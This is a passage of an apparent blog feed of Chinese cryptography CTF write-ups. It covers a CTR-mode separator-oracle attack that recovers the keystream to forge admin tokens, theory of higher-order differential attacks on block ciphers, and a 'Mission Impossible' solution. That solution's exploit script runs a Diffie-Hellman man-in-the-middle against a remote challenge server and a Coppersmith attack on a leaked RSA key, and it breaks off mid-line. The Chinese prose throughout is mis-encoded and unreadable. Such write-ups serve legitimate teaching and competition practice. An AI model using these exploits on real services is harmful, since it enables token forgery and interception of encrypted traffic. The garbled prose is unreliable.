^ <span class="number">2</span>]) + ct[i+<span class="number">1</span>:]</span><br><span class="line">    resp1, resp2 = oracle(new_ct1), oracle(new_ct2)</span><br><span class="line">    <span class="keyword">if</span> resp1 == SeparatorException <span class="keyword">and</span> resp2 == SeparatorException:</span><br><span class="line">        pt[i] = ord(<span class="string">'|'</span>) <span class="comment"># i is a separator's index</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            new_ct = ct[:i] + bytes([ct[i] ^ j]) + ct[i+<span class="number">1</span>:]</span><br><span class="line">            resp = oracle(new_ct)</span><br><span class="line">            <span class="keyword">if</span> resp == SeparatorException: <span class="comment"># add a separator(too much)</span></span><br><span class="line">                pt[i] = j ^ ord(<span class="string">'|'</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">pt = bytes(pt)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line">key = xor(pt, ct)</span><br></pre></td></tr></table></figure><p>åŸç†å¾ˆç®€å•ï¼ŒCTRå®è´¨ä¸Šå¯è§†ä½œæµå¯†ç ï¼ˆå› ä¸ºåœ¨éœ€è¦åŠ è§£å¯†æ—¶ï¼Œå…¶åˆ†ç»„å¯†ç éƒ¨åˆ†å¾—åˆ°çš„keyæ˜¯å›ºå®šçš„ï¼‰</p><p>å¯¹äºctçš„ä»»ä¸€byteï¼Œè‹¥å…¶å¯¹åº”ptçš„byteä¸ºä¸€separatorï¼Œåˆ™åœ¨å¼‚æˆ–ä¸Šä»»ä¸€éé›¶å€¼é€å»è§£å¯†æ—¶ï¼Œoracleå‡ä¼šè¿”å›SeparatorExceptionï¼ˆoccurred by removing a separatorï¼‰</p><p>è€Œè‹¥å¯¹åº”çš„éseparatorï¼Œåˆ™åªéœ€çˆ†ç ´å¼‚æˆ–çš„å€¼ï¼Œå½“è¿”å›SeparatorExceptionæ—¶ï¼Œå³å¯çŸ¥$new_ct\oplus j=ct\oplus ord(â€˜|â€™)$</p><p>é€šè¿‡è¿™ç§æ”»å‡»æ–¹å¼ï¼Œæˆ‘ä»¬èƒ½è¿˜åŸå‡ºåˆ†ç»„åŠ å¯†éƒ¨åˆ†çš„Keyï¼Œä¸”ç”±äºCTR modeæ˜¯æ²¡æœ‰é‰´åˆ«ç æœºåˆ¶çš„</p><p>å› æ­¤æˆ‘ä»¬èƒ½å¾—åˆ°ä»»æ„Pâ€™å¯¹åº”çš„å¯†æ–‡$Câ€™=C\oplus P\oplus Pâ€™$ï¼Œå³åˆæ³•tokenï¼Œè¿›è¡Œadminä¼ªé€ ï¼ˆè‹¥ä¸­é—´ä¸ºæ—¶é—´æˆ³çš„è¯éœ€ç¯¡æ”¹ä¸ºæ»¡è¶³tokenç°ä»æœ‰æ•ˆæœŸå†…çš„å€¼ï¼‰</p><h3 id="é«˜é˜¶å·®åˆ†åˆ†æ"><a href="#é«˜é˜¶å·®åˆ†åˆ†æ" class="headerlink" title="é«˜é˜¶å·®åˆ†åˆ†æ"></a>é«˜é˜¶å·®åˆ†åˆ†æ</h3><h4 id="Theorem0-ç¦»æ•£é«˜é˜¶å‡½æ•°ä¸é«˜é˜¶å·®åˆ†"><a href="#Theorem0-ç¦»æ•£é«˜é˜¶å‡½æ•°ä¸é«˜é˜¶å·®åˆ†" class="headerlink" title="Theorem0 - ç¦»æ•£é«˜é˜¶å‡½æ•°ä¸é«˜é˜¶å·®åˆ†"></a>Theorem0 - ç¦»æ•£é«˜é˜¶å‡½æ•°ä¸é«˜é˜¶å·®åˆ†</h4><p><strong>å®šä¹‰1.</strong> è®¾$(S,+)$å’Œ$(T,+)$æ˜¯ä¸¤ä¸ªAbelç¾¤ï¼Œ$f:S\rightarrow T$ï¼Œåˆ™fåœ¨Sä¸­aç‚¹å¤„çš„å¯¼æ•°å®šä¹‰ä¸º</p><script type="math/tex; mode=display">\Delta_{a}f(x)=f(x+a)-f(x)</script><p>åœ¨ç‚¹$\{a_1,a_2,â€¦,a_i\}$å¤„çš„ié˜¶å¯¼æ•°å®šä¹‰ä¸º</p><script type="math/tex; mode=display">\Delta_{a_1,a_2,...,a_i}^{(i)}f(x)=\Delta_{a_i}(\Delta_{a_1,a_2,...,a_i}^{(i-1)}f(x))</script><p><strong>å‘½é¢˜1.</strong> è®¾fæ˜¯ä¸€ä¸ªnå˜å…ƒçš„å¸ƒå°”å‡½æ•°ï¼Œå‡½æ•°çš„ä»£æ•°æ¬¡æ•°ä¸ºdeg(f)ï¼Œåˆ™</p><script type="math/tex; mode=display">deg(\Delta_af(x))\leq deg(f(x))-1</script><p>(å¸ƒå°”å‡½æ•°fæ˜¯ä»$F_2^n$åˆ°$F_2$çš„æ˜ å°„)</p><p><strong>å‘½é¢˜2.</strong> è®¾fæ˜¯ä¸€ä¸ªnå˜å…ƒçš„å¸ƒå°”å‡½æ•°ï¼Œåˆ™å‡½æ•°çš„né˜¶å¯¼æ•°ä¸ºå¸¸æ•°(constant)ï¼Œè¿›ä¸€æ­¥ï¼Œè‹¥få¯é€†ï¼Œåˆ™å…¶n-1é˜¶å¯¼æ•°ä¸ºå¸¸æ•°</p><p><strong>å‘½é¢˜3.</strong> è®¾fæ˜¯ä¸€ä¸ªnå˜å…ƒçš„å¸ƒå°”å‡½æ•°ï¼Œ$L[a_1,â€¦,a_i]$æ˜¯$a_1,â€¦,a_i$çš„æ‰€æœ‰å¯èƒ½çš„çº¿æ€§ç»„åˆï¼Œåˆ™</p><script type="math/tex; mode=display">\Delta_{a_1,...,a_i}^{(i)}f(x)=\sum_{c\in L[a_1,...,a_i]}f(x\oplus c)</script><p><strong>å‘½é¢˜4.</strong> å¸ƒå°”å‡½æ•°çš„é«˜é˜¶å¯¼æ•°åªä¾èµ–äºå…¶é˜¶çš„å¤§å°ï¼Œå³</p><script type="math/tex; mode=display">\Delta_{a_1,...,a_i}^{(i)}f(x)=\Delta_{a_{\pi(1)},...,a_{\pi(i)}}^{(i)}f(x)</script><p><strong>å‘½é¢˜5.</strong> è®¾$f:F_2^n\rightarrow F_2^n$ï¼Œ$a_1,a_2,â€¦,a_i$æ˜¯$F_2^n$ä¸Šiä¸ªçº¿æ€§æ— å…³çš„å‘é‡ï¼Œè‹¥xåœ¨$F_2^n$ä¸Šåˆ†å¸ƒå‡åŒ€ï¼Œåˆ™å¯¹ä»»æ„$b\in F_2^n$ï¼Œç­‰å¼$\Delta_{a_1,â€¦,a_i}^{(i)}f(x)=b$æˆç«‹çš„æ¦‚ç‡è¦ä¹ˆä¸º0ï¼Œè¦ä¹ˆè‡³å°‘ä¸º$2^{i-n}$</p><p>Proof: å‡è®¾æœ‰$\Delta_{a_1,â€¦,a_i}^{(i)}f(x_0)=b$ï¼Œåˆ™$\sum_{c\in L[a_1,â€¦,a_i]}f(x\oplus c)=b$ï¼Œè¿›è€Œ</p><p>$\forall c\in L[a_1,â€¦,a_i],\Delta_{a_1,â€¦,a_i}^{(i)}f(x_0\oplus c)=b$ï¼Œ$Pro(\Delta_{a_1,â€¦,a_i}^{(i)}f(x)=b)\geq2^{i}/2^{n}=2^{i-n}$</p><p>Q.E.D.</p><p><strong>å‘½é¢˜6.</strong> å½“è¾“å…¥xå‡åŒ€æ—¶ï¼Œåˆ™å·®åˆ†å¯¹(a, b)å‡ºç°çš„æ¦‚ç‡ä¸ºf(x)åœ¨ç‚¹aå¤„çš„ä¸€é˜¶å¯¼æ•°å–å€¼bçš„æ¦‚ç‡</p><p>$P(\Delta_y=b|\Delta_x=a)=P(f(x+a)-f(x)=b)=P(\Delta_af(x)=b)$</p><p>è¿›è€Œæ¨å¹¿è‡³é«˜é˜¶å·®åˆ†ï¼Œå‡½æ•°çš„ä¸€æ¡ié˜¶å·®åˆ†ï¼Œå³æ‰¾åˆ°ä¸€i+1å…ƒæ•°ç»„$(a_1,â€¦,a_i,b)$ï¼Œä½¿å¾—$\Delta_{a_1,â€¦,a_i}^{(i)}f(x)=b$</p><p><strong>ç¦»æ•£é«˜é˜¶å‡½æ•°ä¸é«˜é˜¶å·®åˆ†çš„è”ç³»ä¸ºï¼š</strong> f(x)æœ‰ä¸€æ¡ié˜¶å·®åˆ†$(a_1,â€¦,a_i,b)$å½“ä¸”ä»…å½“f(x)åœ¨$(a_1,â€¦,a_i)$å¤„å¯¼æ•°ä¸ºb</p><h4 id="Theorem1-é«˜é˜¶å·®åˆ†æ”»å‡»"><a href="#Theorem1-é«˜é˜¶å·®åˆ†æ”»å‡»" class="headerlink" title="Theorem1 -  é«˜é˜¶å·®åˆ†æ”»å‡»"></a>Theorem1 -  é«˜é˜¶å·®åˆ†æ”»å‡»</h4><p>ä»¥ä¸‹ä¸ºå¯¹ä¸€èˆ¬åˆ†ç»„å¯†ç çš„é«˜é˜¶å·®åˆ†æ”»å‡»çš„æ¡†æ¶ï¼š</p><p>è®¾Eæ˜¯ä¸€ä¸ªr roundsçš„åˆ†ç»„å¯†ç ç®—æ³•ï¼Œå¯å†™ä½œ$Y=E(X,K)$ï¼Œå‡è®¾</p><p>r-1 roundsçš„åŠ å¯†ç®—æ³•$E_{r-1}(X,K_{1},â€¦,K_{r-1})$çš„degä¸ºdï¼Œåˆ™</p><script type="math/tex; mode=display">\Delta_{a_1,...,a_d}^{(d)}E_{r-1}(X,K_{1},...,K_{r-1})=0</script><p>(ç”±äº$E_{r-1}$å¯é€†)ï¼Œä¸”æœ‰</p><script type="math/tex; mode=display">E_{r}^{-1}(Y,K_{r})=E_{r-1}(X,K_{1},...,K_{r-1})\\\Delta_{a_1,...,a_d}^{(d)}E_{r}^{-1}(Y,K_{r})=0\\\therefore\sum_{c\in L(...)}E_{r}^{-1}(Y\oplus c,K_{r})=0</script><p>åˆ™å½“d-1è¶³å¤Ÿå°æ—¶ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡ä¸‹è¿°æ”»å‡»æµç¨‹è·å¾—æœ€åä¸€è½®çš„è½®å¯†é’¥$K_{r}$ï¼š</p><ol><li>å¯»æ‰¾ä¸€ä¸ªr-1 roundsçš„é«˜é˜¶å·®åˆ†åŒºåˆ†å™¨ï¼›</li><li>æ ¹æ®<strong>å·®åˆ†åŒºåˆ†å™¨</strong>çš„è¾“å‡ºç‰¹å¾ï¼Œç¡®å®šè¦æ¢å¤çš„æœ€åä¸€è½®è½®å¯†é’¥é•¿åº¦ï¼ˆä¸€èˆ¬ä¸ç›´æ¥ä¸€æ¬¡æ€§æ¢å¤å®Œæ•´é•¿åº¦çš„è½®å¯†é’¥ï¼‰ï¼Œä¸å¦¨è®¾æ‰€è¦æ¢å¤çš„éƒ¨åˆ†è½®å¯†é’¥é•¿åº¦ä¸ºsï¼Œåˆ™è®¾ç½®$2^{s}$ä¸ªå¯†é’¥è®¡æ•°å™¨ï¼Œåˆå§‹åŒ–å‡ä¸º0ï¼›</li><li>éšæœºé€‰å–ä¸€ä¸ªdç»´å­ç©ºé—´Lï¼ˆè¦æ±‚Eå¯é€†ï¼‰ï¼Œåˆ™å¯¹æ‰€æœ‰$X\in L$ï¼Œåˆ©ç”¨åŒä¸€æœªçŸ¥çš„å¯†é’¥å¯¹å…¶è¿›è¡ŒåŠ å¯†ï¼Œè·å¾—å¯¹åº”çš„å¯†æ–‡Yï¼ˆChosen Plain Attackï¼ŒOracleï¼‰ï¼›</li><li>åˆ©ç”¨æ‰€æœ‰æœ€åä¸€è½®çš„å€™é€‰å¯†é’¥å¯¹Yè¿›è¡Œè§£å¯†å¹¶<strong>æ±‚å’Œ</strong>ï¼Œè‹¥è¯¥å€¼ä¸º0ï¼Œåˆ™å¯¹åº”counter++ï¼›</li><li>é€‰å–counter maxå¯¹åº”çš„ä½œä¸ºæ­£ç¡®$K_{r}$ï¼›</li></ol>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Block </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(Aurora) - Mission Impossible</title>
      <link href="/2020/04/05/WriteUp-Aurora-Mission-Impossible/"/>
      <url>/2020/04/05/WriteUp-Aurora-Mission-Impossible/</url>
      
        <content type="html"><![CDATA[<h4 id="é¢˜ç›®è€ƒç‚¹"><a href="#é¢˜ç›®è€ƒç‚¹" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>DH-MIMT</li><li>RSAç§é’¥ä½ä½æ³„éœ²å¼•èµ·çš„CopperSmithæ”»å‡» (é¢„æœŸè§£æ˜¯è§£åŒä½™æ–¹ç¨‹)</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶"><a href="#é¢˜ç›®æ–‡ä»¶" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="Impossible Mission.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ"><a href="#é¢˜è§£åˆ†æ" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Step 1</span></span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">flag = adaptmessage(flag) <span class="comment"># right padding with b'\x00'</span></span><br><span class="line">encrypted_flag = b64encode(aes.encrypt(flag))</span><br><span class="line"><span class="comment"># Step 2</span></span><br><span class="line">p = getPrime(<span class="number">700</span>)</span><br><span class="line">q = getPrime(<span class="number">1400</span>)</span><br><span class="line">e = getPrime(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">assert</span>(GCD(e, phi) == <span class="number">1</span>)</span><br><span class="line">enc = pow(bytes_to_long(key), e, n)</span><br><span class="line">print(<span class="string">"Brooke's partial d: "</span> + str(d % (<span class="number">2</span>**<span class="number">1050</span>))) <span class="comment"># leak d's low 1050bits</span></span><br><span class="line"><span class="comment"># Step 3</span></span><br><span class="line"><span class="comment"># DH-MIMT challenging(5 round's success required)</span></span><br><span class="line"><span class="comment"># Finally given message including enc in Step2</span></span><br></pre></td></tr></table></figure><p><strong>Decryption</strong></p><p>DH-MIMTåï¼Œè·å¾—AESå¯†é’¥çš„å¯¹åº”RSAå¯†æ–‡.</p><ul><li>Crack p (700 bits)</li></ul><p>$\because ed_{0}p\equiv p+kpn-kp^{2}-kn+kp(mod\ 2^{size(d_{0})}),k\in [1,e]$</p><p>$\because size(p)&lt;size(d_{0})$</p><p>$\therefore$ æ±‚è§£pçš„ä¸€å…ƒæ¨¡ç­‰å¼å³å¯ï¼ˆè‡³å¤šeæ¬¡ï¼‰</p><ul><li>Crack q (1400 bits)</li></ul><p>$\because size(n)=2100,size(d0)=1050&gt;\frac{size(n)}{4}$</p><p>ç”±Crack pé‡Œæåˆ°çš„æ¨¡ç­‰å¼å¯æ±‚è§£å‡ºqçš„ä½1050 bitsï¼Œå› æ­¤é—®é¢˜è½¬åŒ–ä¸ºpartial_p</p><p>$\beta$å–0.65ç•¥å°äº$\frac{size(q)}{size(n)}$ï¼Œæ ¹ä¸Šç•Œå–$2^{1400-size(q_{0})}$.</p><ul><li>åœ¨Crack pæ—¶æ¯ä¸€è½®startä¸€ä¸ªå®ˆæŠ¤çº¿ç¨‹ï¼Œæ¥è¿›è¡ŒCrack q</li></ul><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">217534615279223294476101434763509239207</span></span><br><span class="line">g = <span class="number">2</span></span><br><span class="line">state = <span class="literal">False</span></span><br><span class="line"><span class="comment"># global N_factor</span></span><br><span class="line">q = <span class="literal">None</span></span><br><span class="line">io = remote(<span class="string">"121.40.247.133"</span>, <span class="string">"28419"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">adapt_message</span><span class="params">(message)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> message.ljust(<span class="number">16</span> - len(message) % <span class="number">16</span> + len(message), <span class="string">b'\x00'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_encrypted_flag</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enc_flag generating [++++++++++++++++]"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"encrypted flag: b'"</span>)</span><br><span class="line">    encrypted_flag = b64decode(io.recvuntil(<span class="string">"'"</span>))</span><br><span class="line">    print(<span class="string">"Enc_flag:"</span>, encrypted_flag)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enc_flag generating completed [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_RSA_key</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] RSA key generating [++++++++++++++++]"</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"e = "</span>)</span><br><span class="line">    e = int(io.recvline())</span><br><span class="line">    print(<span class="string">"e:"</span>, str(e))</span><br><span class="line">    io.recvuntil(<span class="string">"n = "</span>)</span><br><span class="line">    n = int(io.recvline())</span><br><span class="line">    print(<span class="string">"n:"</span>, str(n))</span><br><span class="line">    io.recvuntil(<span class="string">"partial d: "</span>)</span><br><span class="line">    d0 = int(io.recvline()) <span class="comment">#low 1050bits</span></span><br><span class="line">    print(<span class="string">"d0:"</span>, str(d0))</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] RSA key generating completed [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">return</span> (e, n, d0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MITM_connect</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM connecting [++++++++++++++++]"</span>)</span><br><span class="line">    gamma = <span class="number">1551</span></span><br><span class="line">    keyG = pow(g, gamma, p)</span><br><span class="line">    io.recvuntil(<span class="string">"A: "</span>)</span><br><span class="line">    keyA = int(io.recvline())</span><br><span class="line">    print(keyA)</span><br><span class="line">    io.sendlineafter(<span class="string">"A: "</span>, str(keyG))</span><br><span class="line">    io.recvuntil(<span class="string">"B: "</span>)</span><br><span class="line">    keyB = int(io.recvline())</span><br><span class="line">    io.sendlineafter(<span class="string">"B: "</span>, str(keyG))</span><br><span class="line">    keyC = pow(keyB, gamma, p) <span class="comment">#BGé€šä¿¡</span></span><br><span class="line">    keyS = pow(keyA, gamma, p) <span class="comment">#AGé€šä¿¡</span></span><br><span class="line">    keyC = long_to_bytes(keyC).rjust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    keyS = long_to_bytes(keyS).rjust(<span class="number">16</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    cipherC = AES.new(keyC, AES.MODE_ECB)</span><br><span class="line">    cipherS = AES.new(keyS, AES.MODE_ECB)</span><br><span class="line">    print(<span class="string">"keyC:"</span>, keyC)</span><br><span class="line">    print(<span class="string">"keyS:"</span>, keyS)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM connecting completed [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">return</span> (cipherC, cipherS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MITM_conversation</span><span class="params">(cipherC, cipherS)</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM conversation [++++++++++++++++]"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        io.recvuntil(<span class="string">"A: "</span>)</span><br><span class="line">        messageA = io.recvline().strip()</span><br><span class="line">        messageA = long_to_bytes(int(messageA, <span class="number">16</span>))</span><br><span class="line">        messageA = cipherS.decrypt(messageA.rjust((<span class="number">16</span> - len(messageA) % <span class="number">16</span>) % <span class="number">16</span> + len(messageA), <span class="string">b'\x00'</span>))</span><br><span class="line">        print(<span class="string">"A:"</span>, messageA)</span><br><span class="line">        randnum_begin = messageA.find(<span class="string">b'stamp:'</span>) + <span class="number">6</span></span><br><span class="line">        randnum_end = messageA.find(<span class="string">b'\x00'</span>)</span><br><span class="line">        randnum = bytes(str((int(messageA[randnum_begin:randnum_end]) + <span class="number">1</span>) % <span class="number">256</span>), encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        new_messageA = messageA[:randnum_begin] + randnum</span><br><span class="line">        new_messageA = adapt_message(new_messageA)</span><br><span class="line">        print(<span class="string">"G:"</span>, new_messageA)</span><br><span class="line">        s = cipherC.encrypt(new_messageA)</span><br><span class="line">        s = hex(bytes_to_long(s))[<span class="number">2</span>:]</span><br><span class="line">        io.sendlineafter(<span class="string">"A: "</span>, s)</span><br><span class="line">        io.recvuntil(<span class="string">"B: "</span>)</span><br><span class="line">        messageB = io.recvline().strip()</span><br><span class="line">        messageB = long_to_bytes(int(messageB, <span class="number">16</span>))</span><br><span class="line">        messageB = cipherC.decrypt(messageB.rjust((<span class="number">16</span> - len(messageB) % <span class="number">16</span>) % <span class="number">16</span> + len(messageB), <span class="string">b'\x00'</span>))</span><br><span class="line">        print(<span class="string">"B:"</span>, messageB)</span><br><span class="line">        randnum_begin = messageB.find(<span class="string">b'stamp:'</span>) + <span class="number">6</span></span><br><span class="line">        randnum_end = messageB.find(<span class="string">b'\x00'</span>)</span><br><span class="line">        randnum = bytes(str((int(messageB[randnum_begin:randnum_end]) + <span class="number">1</span>) % <span class="number">256</span>), encoding=<span class="string">"utf8"</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">4</span>:</span><br><span class="line">            new_messageB = <span class="string">b'I want to get my AES-key.\ntimestamp:'</span> + randnum</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            new_messageB = messageB[:randnum_begin] + randnum</span><br><span class="line">        new_messageB = adapt_message(new_messageB)</span><br><span class="line">        print(<span class="string">"G:"</span>, new_messageB)</span><br><span class="line">        s = cipherS.encrypt(new_messageB)</span><br><span class="line">        s = hex(bytes_to_long(s))[<span class="number">2</span>:]</span><br><span class="line">        io.sendlineafter(<span class="string">"B: "</span>, s)</span><br><span class="line">    io.recvuntil(<span class="string">"A: "</span>)</span><br><span class="line">    res = io.recvline().strip()</span><br><span class="line">    res = long_to_bytes(int(res, <span class="number">16</span>))</span><br><span class="line">    res = cipherS.decrypt(res.rjust((<span class="number">16</span> - len(res) % <span class="number">16</span>) % <span class="number">16</span> + len(res), <span class="string">b'\x00'</span>))</span><br><span class="line">    print(res)</span><br><span class="line">    enc_begin = res.find(<span class="string">b'key: '</span>) + <span class="number">5</span></span><br><span class="line">    enc_end = res.find(<span class="string">b'\ntimestamp'</span>)</span><br><span class="line">    enc = res[enc_begin:enc_end]</span><br><span class="line">    print(<span class="string">'enc:'</span>, enc)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] MITM conversation completed [++++++++++++++++]"</span>)</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(enc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partial_p</span><span class="params">(p0, kbits, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> state</span><br><span class="line">    <span class="keyword">global</span> q</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(<span class="number">1400</span>-kbits), beta=<span class="number">0.65</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">if</span> ZZ(p):</span><br><span class="line">            q = int(p)</span><br><span class="line">            state = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_p</span><span class="params">(d0, kbits, e, n)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> state</span><br><span class="line">    <span class="keyword">global</span> q</span><br><span class="line">    X = var(<span class="string">'X'</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        print(<span class="string">"\r&#123;&#125;/&#123;&#125;"</span>.format(k, e), end=<span class="string">""</span>)</span><br><span class="line">        <span class="keyword">if</span> state == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span 